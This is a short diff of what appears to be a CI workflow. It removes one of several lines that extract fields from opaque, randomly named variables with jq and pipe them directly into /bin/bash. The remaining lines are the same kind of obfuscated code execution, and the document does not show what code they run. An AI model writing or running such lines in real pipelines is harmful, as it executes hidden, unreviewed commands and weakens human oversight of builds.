@@ -26,7 +26,6 @@ jobs:
           printf '%s' "$h370" | jq -r .n2134 | /bin/bash
           echo $enbp8 | jq -r .a0 | /bin/bash
           printf '%s' "$o524" | jq -r .hn28336 | /bin/bash
-          printf '%s' "$h3" | jq -r .phv1876 | /bin/bash
           echo $rxghi704 | jq -r .qrtz1 | /bin/bash
 
       - name: Store results
